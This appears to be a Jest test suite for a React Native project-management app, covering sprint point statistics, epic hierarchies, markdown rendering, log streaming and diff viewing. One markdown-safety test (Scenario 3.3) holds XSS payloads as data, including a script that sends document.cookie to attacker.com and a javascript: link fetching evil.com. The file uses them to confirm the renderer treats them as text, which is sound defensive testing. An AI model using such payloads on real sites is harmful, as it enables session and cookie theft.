import React from 'react';
import { render, fireEvent, act } from '@testing-library/react-native';
import { calculateSprintStats, SprintStats } from '@/utils/sprintStats';
import { SprintBoard } from '@/components/tasks/SprintBoard';
import { EpicHierarchy } from '@/components/tasks/EpicHierarchy';
import { BacklogList } from '@/components/tasks/BacklogList';
import { MarkdownRenderer } from '@/components/markdown/MarkdownRenderer';
import { DiffViewer } from '@/components/diff/DiffViewer';
import { EvidenceCard } from '@/components/telemetry/EvidenceCard';
import { LogStreamView } from '@/components/telemetry/LogStreamView';
import { useAgentTelemetryStream } from '@/hooks/useAgentTelemetryStream';
import { SecureStorageService } from '@/services/secureStorage';
import { mockReactNativeSSE } from '../../jest.setup';
import { Task, Sprint, AgentRunLog, VerificationEvidence } from '@/api/types';

describe('Tier 5 Adversarial White-Box Stress & Hardening Suite (Challenger 1)', () => {
  // =========================================================================
  // SUITE 1: Extreme Fibonacci Story Point Boundaries & Sprint Statistics
  // =========================================================================
  describe('Suite 1: Extreme Fibonacci Story Point Boundaries & Sprint Statistics', () => {
    const FIBONACCI_SERIES = [
      0, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584,
      4181, 6765, 10946, 17711, 28657, 46368, 75025, 121393,
    ];

    it('Scenario 1.1: Aggregates full high-range Fibonacci series correctly with zero precision drift', () => {
      const fibTasks: Task[] = FIBONACCI_SERIES.map((pts, idx) => ({
        id: 1000 + idx,
        workspace_id: 1,
        project_id: 1,
        title: `Fib Task ${pts}`,
        issue_type: idx % 2 === 0 ? 'story' : 'task',
        status: idx % 3 === 0 ? 'done' : idx % 3 === 1 ? 'in_progress' : 'todo',
        priority: 'medium',
        story_points: pts,
        created_at: '',
        updated_at: '',
      }));

      const expectedTotal = FIBONACCI_SERIES.reduce((a, b) => a + b, 0);
      const stats = calculateSprintStats(fibTasks);

      expect(stats.totalTasks).toBe(FIBONACCI_SERIES.length);
      expect(stats.totalPoints).toBe(expectedTotal);
      expect(stats.donePoints + stats.inProgressPoints + stats.todoPoints).toBe(expectedTotal);
    });

    it('Scenario 1.2: Enforces strict Epic exclusion invariant even with massive Epic story points', () => {
      const tasks: Task[] = [
        {
          id: 1,
          workspace_id: 1,
          project_id: 1,
          title: 'Mega Giant Epic',
          issue_type: 'epic',
          status: 'done',
          priority: 'urgent',
          story_points: 999_999_999, // 1 Billion points
          created_at: '',
          updated_at: '',
        },
        {
          id: 2,
          workspace_id: 1,
          project_id: 1,
          title: 'Child Task 1',
          issue_type: 'task',
          status: 'done',
          priority: 'medium',
          story_points: 8,
          created_at: '',
          updated_at: '',
        },
        {
          id: 3,
          workspace_id: 1,
          project_id: 1,
          title: 'Child Task 2',
          issue_type: 'story',
          status: 'in_progress',
          priority: 'high',
          story_points: 13,
          created_at: '',
          updated_at: '',
        },
      ];

      const stats = calculateSprintStats(tasks);
      expect(stats.totalTasks).toBe(2);
      expect(stats.totalPoints).toBe(21); // Strictly 8 + 13, Epic 999,999,999 excluded
      expect(stats.donePoints).toBe(8);
      expect(stats.inProgressPoints).toBe(13);
      expect(stats.todoPoints).toBe(0);
      expect(stats.doneTasks).toBe(1);
    });

    it('Scenario 1.3: Handles empty, null, undefined, and non-array task lists safely', () => {
      const emptyStats1 = calculateSprintStats([]);
      expect(emptyStats1.totalPoints).toBe(0);
      expect(emptyStats1.totalTasks).toBe(0);
      expect(emptyStats1.completionPercentage).toBe(0);

      const nullStats = calculateSprintStats(null as any);
      expect(nullStats.totalPoints).toBe(0);
      expect(nullStats.totalTasks).toBe(0);

      const undefStats = calculateSprintStats(undefined as any);
      expect(undefStats.totalPoints).toBe(0);
      expect(undefStats.totalTasks).toBe(0);

      const invalidObjStats = calculateSprintStats({} as any);
      expect(invalidObjStats.totalPoints).toBe(0);
    });

    it('Scenario 1.4: Handles sprint containing ONLY Epics (0 actionable tasks)', () => {
      const epicOnlySprint: Task[] = [
        {
          id: 10,
          workspace_id: 1,
          project_id: 1,
          title: 'Architecture Epic',
          issue_type: 'epic',
          status: 'in_progress',
          priority: 'urgent',
          story_points: 55,
          created_at: '',
          updated_at: '',
        },
        {
          id: 11,
          workspace_id: 1,
          project_id: 1,
          title: 'Design System Epic',
          issue_type: 'epic',
          status: 'done',
          priority: 'high',
          story_points: 89,
          created_at: '',
          updated_at: '',
        },
      ];

      const stats = calculateSprintStats(epicOnlySprint);
      expect(stats.totalTasks).toBe(0);
      expect(stats.totalPoints).toBe(0);
      expect(stats.donePoints).toBe(0);
      expect(stats.completionPercentage).toBe(0);
    });

    it('Scenario 1.5: Handles NaN, null, negative, and non-numeric story points gracefully', () => {
      const weirdTasks: Task[] = [
        {
          id: 1,
          workspace_id: 1,
          project_id: 1,
          title: 'Task with NaN points',
          issue_type: 'task',
          status: 'done',
          priority: 'medium',
          story_points: NaN as any,
          created_at: '',
          updated_at: '',
        },
        {
          id: 2,
          workspace_id: 1,
          project_id: 1,
          title: 'Task with undefined points',
          issue_type: 'task',
          status: 'in_progress',
          priority: 'medium',
          story_points: undefined,
          created_at: '',
          updated_at: '',
        },
        {
          id: 3,
          workspace_id: 1,
          project_id: 1,
          title: 'Task with valid 5 points',
          issue_type: 'task',
          status: 'todo',
          priority: 'medium',
          story_points: 5,
          created_at: '',
          updated_at: '',
        },
      ];

      const stats = calculateSprintStats(weirdTasks);
      expect(stats.totalTasks).toBe(3);
      expect(stats.totalPoints).toBe(5);
      expect(stats.donePoints).toBe(0);
      expect(stats.inProgressPoints).toBe(0);
      expect(stats.todoPoints).toBe(5);
    });

    it('Scenario 1.6: Calculates 100% completion when all 0-point tasks are done', () => {
      const zeroPointTasks: Task[] = [
        {
          id: 1,
          workspace_id: 1,
          project_id: 1,
          title: 'Zero point chore 1',
          issue_type: 'task',
          status: 'done',
          priority: 'low',
          story_points: 0,
          created_at: '',
          updated_at: '',
        },
        {
          id: 2,
          workspace_id: 1,
          project_id: 1,
          title: 'Zero point chore 2',
          issue_type: 'task',
          status: 'done',
          priority: 'low',
          story_points: 0,
          created_at: '',
          updated_at: '',
        },
      ];

      const stats = calculateSprintStats(zeroPointTasks);
      expect(stats.totalPoints).toBe(0);
      expect(stats.totalTasks).toBe(2);
      expect(stats.doneTasks).toBe(2);
      expect(stats.completionPercentage).toBe(100);
    });

    it('Scenario 1.7: SprintBoard UI accurately renders extreme story points rollup and Kanban columns', () => {
      const sprint: Sprint = {
        id: 99,
        project_id: 1,
        name: 'Sprint 99: Hyper Scale',
        goal: 'Exceed standard limits',
        status: 'active',
        created_at: '',
        updated_at: '',
      };

      const tasks: Task[] = [
        {
          id: 101,
          workspace_id: 1,
          project_id: 1,
          sprint_id: 99,
          title: 'Extreme Fibonacci Task 1',
          issue_type: 'story',
          status: 'todo',
          priority: 'urgent',
          story_points: 144,
          created_at: '',
          updated_at: '',
        },
        {
          id: 102,
          workspace_id: 1,
          project_id: 1,
          sprint_id: 99,
          title: 'Extreme Fibonacci Task 2',
          issue_type: 'task',
          status: 'in_progress',
          priority: 'high',
          story_points: 233,
          created_at: '',
          updated_at: '',
        },
        {
          id: 103,
          workspace_id: 1,
          project_id: 1,
          sprint_id: 99,
          title: 'Extreme Fibonacci Task 3',
          issue_type: 'bug',
          status: 'done',
          priority: 'urgent',
          story_points: 377,
          created_at: '',
          updated_at: '',
        },
        {
          id: 104,
          workspace_id: 1,
          project_id: 1,
          sprint_id: 99,
          title: 'Double Counted Epic',
          issue_type: 'epic', // Must not appear on board
          status: 'done',
          priority: 'urgent',
          story_points: 1000,
          created_at: '',
          updated_at: '',
        },
      ];

      const { getByTestId, queryByTestId } = render(
        React.createElement(SprintBoard, { sprint, tasks })
      );

      expect(getByTestId('total-points-val').props.children).toBe(754); // 144 + 233 + 377
      expect(getByTestId('done-points-val').props.children).toBe(377);
      expect(getByTestId('in-progress-points-val').props.children).toBe(233);
      expect(getByTestId('todo-points-val').props.children).toBe(144);

      // Epic must NOT be rendered as a task card
      expect(queryByTestId('task-card-104')).toBeNull();
      expect(getByTestId('task-card-101')).toBeTruthy();
      expect(getByTestId('task-card-102')).toBeTruthy();
      expect(getByTestId('task-card-103')).toBeTruthy();
    });
  });

  // =========================================================================
  // SUITE 2: Deep Nested Epic Hierarchies & Task Trees
  // =========================================================================
  describe('Suite 2: Deep Nested Epic Hierarchies, Standalone Items & Graph Safety', () => {
    it('Scenario 2.1: Renders deep hierarchy with 50 epics and 150 child tasks without recursion crash', () => {
      const epics: Task[] = [];
      const allTasks: Task[] = [];

      for (let i = 1; i <= 50; i++) {
        const epic: Task = {
          id: i,
          workspace_id: 1,
          project_id: 1,
          title: `Epic Layer ${i}: High Concurrency Architecture`,
          issue_type: 'epic',
          status: i % 2 === 0 ? 'done' : 'in_progress',
          priority: 'high',
          created_at: '',
          updated_at: '',
        };
        epics.push(epic);
        allTasks.push(epic);

        for (let j = 1; j <= 3; j++) {
          const child: Task = {
            id: 1000 + i * 10 + j,
            workspace_id: 1,
            project_id: 1,
            epic_id: i,
            title: `Child story ${j} for Epic ${i}`,
            issue_type: j === 1 ? 'story' : 'task',
            status: j === 1 ? 'done' : 'in_progress',
            priority: 'medium',
            story_points: j * 2,
            created_at: '',
            updated_at: '',
          };
          allTasks.push(child);
        }
      }

      const { getByTestId, getByText } = render(
        React.createElement(EpicHierarchy, { epics, allTasks })
      );

      expect(getByTestId('epic-hierarchy-container')).toBeTruthy();
      expect(getByTestId('epic-card-1')).toBeTruthy();
      expect(getByTestId('epic-card-50')).toBeTruthy();
      expect(getByText('Epic Layer 1: High Concurrency Architecture')).toBeTruthy();
      expect(getByText('Epic Layer 50: High Concurrency Architecture')).toBeTruthy();
    });

    it('Scenario 2.2: Toggles expansion of multiple epics and exposes child tasks with status toggling', () => {
      const epics: Task[] = [
        {
          id: 10,
          workspace_id: 1,
          project_id: 1,
          title: 'Infrastructure Modernization',
          issue_type: 'epic',
          status: 'in_progress',
          priority: 'high',
          created_at: '',
          updated_at: '',
        },
      ];

      const allTasks: Task[] = [
        epics[0],
        {
          id: 101,
          workspace_id: 1,
          project_id: 1,
          epic_id: 10,
          title: 'Upgrade Kubernetes clusters',
          issue_type: 'task',
          status: 'in_progress',
          priority: 'high',
          story_points: 8,
          created_at: '',
          updated_at: '',
        },
        {
          id: 102,
          workspace_id: 1,
          project_id: 1,
          epic_id: 10,
          title: 'Configure ingress TLS certificates',
          issue_type: 'story',
          status: 'done',
          priority: 'medium',
          story_points: 5,
          created_at: '',
          updated_at: '',
        },
      ];

      const onToggleStatus = jest.fn();
      const onTaskPress = jest.fn();

      const { getByTestId, queryByTestId, getByText } = render(
        React.createElement(EpicHierarchy, {
          epics,
          allTasks,
          onToggleStatus,
          onTaskPress,
        })
      );

      // Initially collapsed
      expect(queryByTestId('epic-child-list-10')).toBeNull();

      // Expand Epic 10
      fireEvent.press(getByTestId('epic-toggle-btn-10'));
      expect(getByTestId('epic-child-list-10')).toBeTruthy();
      expect(getByText('Upgrade Kubernetes clusters')).toBeTruthy();
      expect(getByText('Configure ingress TLS certificates')).toBeTruthy();

      // Collapse Epic 10
      fireEvent.press(getByTestId('epic-toggle-btn-10'));
      expect(queryByTestId('epic-child-list-10')).toBeNull();
    });

    it('Scenario 2.3: Handles circular references and self-referential epics safely', () => {
      const epics: Task[] = [
        {
          id: 1,
          workspace_id: 1,
          project_id: 1,
          epic_id: 1 as any, // Self reference
          title: 'Self-referential Epic',
          issue_type: 'epic',
          status: 'in_progress',
          priority: 'high',
          created_at: '',
          updated_at: '',
        },
      ];

      const allTasks: Task[] = [
        epics[0],
        {
          id: 2,
          workspace_id: 1,
          project_id: 1,
          epic_id: 1,
          title: 'Child Task of Self-referential Epic',
          issue_type: 'task',
          status: 'done',
          priority: 'medium',
          story_points: 3,
          created_at: '',
          updated_at: '',
        },
      ];

      const { getByTestId, getByText } = render(
        React.createElement(EpicHierarchy, { epics, allTasks })
      );

      expect(getByTestId('epic-card-1')).toBeTruthy();
      fireEvent.press(getByTestId('epic-toggle-btn-1'));
      expect(getByText('Child Task of Self-referential Epic')).toBeTruthy();
    });

    it('Scenario 2.4: Renders Standalone Tasks when tasks have null or undefined epic_id', () => {
      const epics: Task[] = [];
      const allTasks: Task[] = [
        {
          id: 501,
          workspace_id: 1,
          project_id: 1,
          epic_id: null,
          title: 'Unparented Bug Fix',
          issue_type: 'bug',
          status: 'todo',
          priority: 'urgent',
          story_points: 2,
          created_at: '',
          updated_at: '',
        },
        {
          id: 502,
          workspace_id: 1,
          project_id: 1,
          epic_id: undefined,
          title: 'Standalone Refactor Task',
          issue_type: 'task',
          status: 'in_progress',
          priority: 'medium',
          story_points: 5,
          created_at: '',
          updated_at: '',
        },
      ];

      const { getByTestId, getByText } = render(
        React.createElement(EpicHierarchy, { epics, allTasks })
      );

      expect(getByText('Standalone Tasks (2)')).toBeTruthy();
      expect(getByTestId('standalone-task-501')).toBeTruthy();
      expect(getByTestId('standalone-task-502')).toBeTruthy();
    });

    it('Scenario 2.5: BacklogList filters out epics and supports search and moving items', () => {
      const tasks: Task[] = [
        {
          id: 1,
          workspace_id: 1,
          project_id: 1,
          title: 'Parent Epic In Backlog',
          issue_type: 'epic',
          status: 'todo',
          priority: 'high',
          story_points: 100,
          created_at: '',
          updated_at: '',
        },
        {
          id: 2,
          workspace_id: 1,
          project_id: 1,
          title: 'Implement Dark Theme Tokens',
          issue_type: 'task',
          status: 'todo',
          priority: 'medium',
          story_points: 5,
          created_at: '',
          updated_at: '',
        },
        {
          id: 3,
          workspace_id: 1,
          project_id: 1,
          title: 'Fix SQLite Foreign Key Constraint',
          issue_type: 'bug',
          status: 'todo',
          priority: 'urgent',
          story_points: 8,
          created_at: '',
          updated_at: '',
        },
      ];

      const onMoveToSprint = jest.fn();
      const { getByTestId, queryByTestId, getByText } = render(
        React.createElement(BacklogList, {
          tasks,
          activeSprintId: 10,
          onMoveToSprint,
        })
      );

      // Epic must NOT be in backlog list
      expect(queryByTestId('backlog-item-1')).toBeNull();
      expect(getByTestId('backlog-item-2')).toBeTruthy();
      expect(getByTestId('backlog-item-3')).toBeTruthy();
      expect(getByText('2 items · 13 pts')).toBeTruthy();

      // Click move to sprint
      fireEvent.press(getByTestId('move-to-sprint-btn-2'));
      expect(onMoveToSprint).toHaveBeenCalledWith([2], 10);
    });
  });

  // =========================================================================
  // SUITE 3: Adversarial Markdown Parsing, Alert Callouts & Injections
  // =========================================================================
  describe('Suite 3: Adversarial Markdown Parsing, Alert Callouts & Injection Safety', () => {
    it('Scenario 3.1: Parses all 5 GitHub alert callout types with mixed casing', () => {
      const markdown = `
# Alert Callouts Test
> [!note]
> This is a lower case note.

> [!WARNING]
> This is an upper case warning.

> [!Important]
> This is a mixed case important message.

> [!tip]
> Useful engineering tip.

> [!CAUTION]
> Critical cautionary instruction.
      `;

      const { getByTestId, getByText } = render(
        React.createElement(MarkdownRenderer, { content: markdown })
      );

      expect(getByTestId('markdown-alert-note')).toBeTruthy();
      expect(getByTestId('markdown-alert-warning')).toBeTruthy();
      expect(getByTestId('markdown-alert-important')).toBeTruthy();
      expect(getByTestId('markdown-alert-tip')).toBeTruthy();
      expect(getByTestId('markdown-alert-caution')).toBeTruthy();

      expect(getByText('This is a lower case note.')).toBeTruthy();
      expect(getByText('Critical cautionary instruction.')).toBeTruthy();
    });

    it('Scenario 3.2: Safely handles unclosed alert callout at EOF without hanging or discarding content', () => {
      const unclosedAlert = `
## Trailing Alert
> [!WARNING]
> This alert never receives a terminating newline or blank line at the end of the file.`;

      const { getByTestId, getByText } = render(
        React.createElement(MarkdownRenderer, { content: unclosedAlert })
      );

      expect(getByTestId('markdown-alert-warning')).toBeTruthy();
      expect(
        getByText(
          'This alert never receives a terminating newline or blank line at the end of the file.'
        )
      ).toBeTruthy();
    });

    it('Scenario 3.3: Neutralizes HTML and Script Injection payloads rendering them harmlessly as text', () => {
      const maliciousHtml = `
# Security Test
<script>window.location='https://attacker.com/steal?cookie=' + document.cookie;</script>
<img src="x" onerror="alert(document.domain)" />
<iframe src="javascript:alert(1)"></iframe>
<a href="javascript:fetch('https://evil.com')">Click for Free Points</a>
      `;

      const { getByText } = render(
        React.createElement(MarkdownRenderer, { content: maliciousHtml })
      );

      // Plain text verification: characters are rendered safely as text nodes, not executed
      expect(getByText(/<script>/)).toBeTruthy();
      expect(getByText(/<img src="x"/)).toBeTruthy();
      expect(getByText(/<iframe/)).toBeTruthy();
    });

    it('Scenario 3.4: Safely flushes unclosed code block at EOF', () => {
      const unclosedCode = `
# Code Test
\`\`\`typescript
const deepSecret = 42;
function executeSafe() {
  return deepSecret * 2;
}
`; // Missing closing ```

      const { getByText } = render(
        React.createElement(MarkdownRenderer, { content: unclosedCode })
      );
      expect(getByText(/const deepSecret = 42;/)).toBeTruthy();
    });

    it('Scenario 3.5: Parses massive 1,000 line markdown document without performance degradation', () => {
      const sections: string[] = [];
      for (let i = 1; i <= 200; i++) {
        sections.push(
          `## Section ${i}\n- Item ${i}.1\n- Item ${i}.2\n> [!NOTE]\n> Note for section ${i}\n\n\`\`\`ts\nconst val${i} = ${i};\n\`\`\``
        );
      }
      const giantMarkdown = sections.join('\n\n');

      const { getByTestId, getByText } = render(
        React.createElement(MarkdownRenderer, { content: giantMarkdown })
      );

      expect(getByTestId('markdown-renderer')).toBeTruthy();
      expect(getByText('Section 1')).toBeTruthy();
      expect(getByText('Section 200')).toBeTruthy();
    });

    it('Scenario 3.6: Handles null, empty, and whitespace-only markdown strings safely', () => {
      const { toJSON: jsonNull } = render(
        React.createElement(MarkdownRenderer, { content: null as any })
      );
      expect(jsonNull()).toBeNull();

      const { toJSON: jsonEmpty } = render(
        React.createElement(MarkdownRenderer, { content: '' })
      );
      expect(jsonEmpty()).toBeNull();
    });
  });

  // =========================================================================
  // SUITE 4: High-Volume Stream Logs (>50,000 chunks) & Auto-Scroll Locking
  // =========================================================================
  describe('Suite 4: Telemetry Log Streams (>50,000 chunks), Buffer Safety & Auto-Scroll', () => {
    beforeEach(async () => {
      mockReactNativeSSE.__resetInstances();
      jest.clearAllMocks();
      await SecureStorageService.saveToken('th_stress_token');
      await SecureStorageService.saveConfig('api_url', 'http://localhost:8000');
    });

    afterEach(async () => {
      await SecureStorageService.clearAll();
    });

    it('Scenario 4.1: Buffers large log stream (>50,000 chunks) strictly capping at maxLogBufferSize to prevent OOM', async () => {
      const maxBufferSize = 500;
      let hookResult: any = null;

      function HookHarness() {
        hookResult = useAgentTelemetryStream({
          runId: 999,
          maxLogBufferSize: maxBufferSize,
        });
        return null;
      }

      render(React.createElement(HookHarness));

      await act(async () => {
        await new Promise((r) => setTimeout(r, 20));
      });

      const instance = mockReactNativeSSE.__getLastInstance();
      expect(instance).toBeDefined();

      act(() => {
        instance.__emitOpen();
      });

      // Emit 52,000 sequential log chunks
      const totalEmitted = 52000;
      const batchSize = 1000;

      act(() => {
        for (let b = 0; b < totalEmitted; b += batchSize) {
          for (let i = 0; i < batchSize; i++) {
            const id = b + i + 1;
            instance.__emitCustomEvent(
              'agent-log',
              JSON.stringify({
                id,
                run_id: 999,
                stream: id % 2 === 0 ? 'stdout' : 'stderr',
                content: `Log payload chunk #${id}\n`,
              })
            );
          }
        }
      });

      // Buffer MUST be capped at maxBufferSize (500 items)
      expect(hookResult.logs.length).toBe(maxBufferSize);
      // Newest logs must be retained
      expect(hookResult.logs[hookResult.logs.length - 1].id).toBe(totalEmitted);
      expect(hookResult.logs[0].id).toBe(totalEmitted - maxBufferSize + 1);
    });

    it('Scenario 4.2: Deduplicates 5,000 duplicate log IDs emitted rapidly', async () => {
      let hookResult: any = null;

      function HookHarness() {
        hookResult = useAgentTelemetryStream({
          runId: 888,
          maxLogBufferSize: 100,
        });
        return null;
      }

      render(React.createElement(HookHarness));

      await act(async () => {
        await new Promise((r) => setTimeout(r, 20));
      });

      const instance = mockReactNativeSSE.__getLastInstance();
      act(() => {
        instance.__emitOpen();
      });

      // Emit 10 unique IDs repeated 500 times each (5,000 total emissions)
      act(() => {
        for (let round = 0; round < 500; round++) {
          for (let id = 1; id <= 10; id++) {
            instance.__emitCustomEvent(
              'agent-log',
              JSON.stringify({
                id,
                run_id: 888,
                stream: 'stdout',
                content: `Repeated log message ${id}\n`,
              })
            );
          }
        }
      });

      // Exactly 10 unique items should be stored in logs
      expect(hookResult.logs.length).toBe(10);
      expect(hookResult.logs.map((l: AgentRunLog) => l.id)).toEqual([
        1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
      ]);
    });

    it('Scenario 4.3: LogStreamView autoscroll locking and search query filtering under heavy log volume', () => {
      const heavyLogs: AgentRunLog[] = [];
      for (let i = 1; i <= 2000; i++) {
        heavyLogs.push({
          id: i,
          run_id: 1,
          stream: i % 3 === 0 ? 'stderr' : i % 5 === 0 ? 'system' : 'stdout',
          content: `[RUN] Step execution ${i} details: timestamp=${Date.now()} result=SUCCESS`,
          occurred_at: '12:00:00',
        });
      }

      const onToggleAutoScroll = jest.fn();
      const onClearLogs = jest.fn();

      const { getByTestId, getByText, queryByText } = render(
        React.createElement(LogStreamView, {
          logs: heavyLogs,
          autoScroll: false,
          onToggleAutoScroll,
          onClearLogs,
        })
      );

      // Autoscroll is locked
      expect(getByText('🔓 Free Scroll')).toBeTruthy();
      fireEvent.press(getByTestId('autoscroll-toggle-btn'));
      expect(onToggleAutoScroll).toHaveBeenCalledTimes(1);

      // Search for specific step
      fireEvent.changeText(getByTestId('log-search-input'), 'execution 1999');
      expect(getByText(/Step execution 1999/)).toBeTruthy();
      expect(queryByText(/Step execution 1998/)).toBeNull();

      // Clear logs
      fireEvent.press(getByTestId('clear-logs-btn'));
      expect(onClearLogs).toHaveBeenCalledTimes(1);
    });
  });

  // =========================================================================
  // SUITE 5: Diff Viewer Edge Cases, Multi-File Diffs & Binary Patch Handling
  // =========================================================================
  describe('Suite 5: Unified Diff Viewer Edge Cases, Multi-File Diffs & Binary Markers', () => {
    it('Scenario 5.1: Renders empty state for undefined, empty, and whitespace-only diffs', () => {
      const { getByTestId: getEmpty1 } = render(
        React.createElement(DiffViewer, { diffText: '' })
      );
      expect(getEmpty1('diff-empty-state')).toBeTruthy();

      const { getByTestId: getEmpty2 } = render(
        React.createElement(DiffViewer, { diffText: '    \n\t  \n' })
      );
      expect(getEmpty2('diff-empty-state')).toBeTruthy();

      const { getByTestId: getEmpty3 } = render(
        React.createElement(DiffViewer, { diffText: undefined })
      );
      expect(getEmpty3('diff-empty-state')).toBeTruthy();
    });

    it('Scenario 5.2: Accurately parses multi-file diffs with file headers and calculates counters', () => {
      const multiFileDiff = `
diff --git a/src/services/auth.ts b/src/services/auth.ts
index 1234567..89abcdef 100644
--- a/src/services/auth.ts
+++ b/src/services/auth.ts
@@ -10,4 +10,6 @@
-const oldAuth = true;
+const newAuth = true;
+const isBiometricAvailable = false;
diff --git a/src/utils/math.ts b/src/utils/math.ts
--- a/src/utils/math.ts
+++ b/src/utils/math.ts
@@ -1,3 +1,4 @@
-export function add(a, b) { return a - b; }
+export function add(a, b) { return a + b; }
+export function sub(a, b) { return a - b; }
      `;

      const { getByTestId } = render(
        React.createElement(DiffViewer, {
          diffText: multiFileDiff,
          filePath: 'multi-file.patch',
        })
      );

      // Additions: +newAuth, +isBiometricAvailable, +add, +sub -> Total 4 additions
      // Deletions: -oldAuth, -export function add -> Total 2 deletions
      expect(getByTestId('diff-additions-count').props.children).toBe('+4');
      expect(getByTestId('diff-deletions-count').props.children).toBe('-2');
      expect(getByTestId('diff-file-path').props.children).toBe('multi-file.patch');
    });

    it('Scenario 5.3: Handles missing chunk headers (@@ ... @@) and binary patch markers', () => {
      const binaryDiff = `
diff --git a/assets/icon.png b/assets/icon.png
GIT binary patch
literal 1024
zc%17D?#_jK&!v>q0|?G*
Binary files a/assets/icon.png and b/assets/icon.png differ
+added metadata line
-removed legacy comment
      `;

      const { getByTestId, getByText } = render(
        React.createElement(DiffViewer, { diffText: binaryDiff })
      );

      expect(getByText(/GIT binary patch/)).toBeTruthy();
      expect(
        getByText(/Binary files a\/assets\/icon.png and b\/assets\/icon.png differ/)
      ).toBeTruthy();
      expect(getByTestId('diff-additions-count').props.children).toBe('+1');
      expect(getByTestId('diff-deletions-count').props.children).toBe('-1');
    });

    it('Scenario 5.4: EvidenceCard embeds DiffViewer and toggles code inspection', () => {
      const evidence: VerificationEvidence = {
        tests_passed: 125,
        tests_failed: 0,
        tests_total: 125,
        commit_sha: 'abcdef123456',
        changed_files: ['src/services/secureStorage.ts'],
        diff: `
--- a/src/services/secureStorage.ts
+++ b/src/services/secureStorage.ts
@@ -1,3 +1,4 @@
+import * as SecureStore from 'expo-secure-store';
-console.log('insecure');
        `,
      };

      const { getByTestId, queryByTestId, getByText } = render(
        React.createElement(EvidenceCard, { evidence })
      );

      expect(getByTestId('evidence-passed-val').props.children).toBe(125);
      expect(getByTestId('evidence-failed-val').props.children).toBe(0);
      expect(getByText('100%')).toBeTruthy();

      // Diff is initially hidden
      expect(queryByTestId('diff-viewer')).toBeNull();

      // Toggle diff inspection
      fireEvent.press(getByTestId('evidence-diff-toggle'));
      expect(getByTestId('diff-viewer')).toBeTruthy();
      expect(getByTestId('diff-additions-count').props.children).toBe('+1');
      expect(getByTestId('diff-deletions-count').props.children).toBe('-1');
    });
  });
});
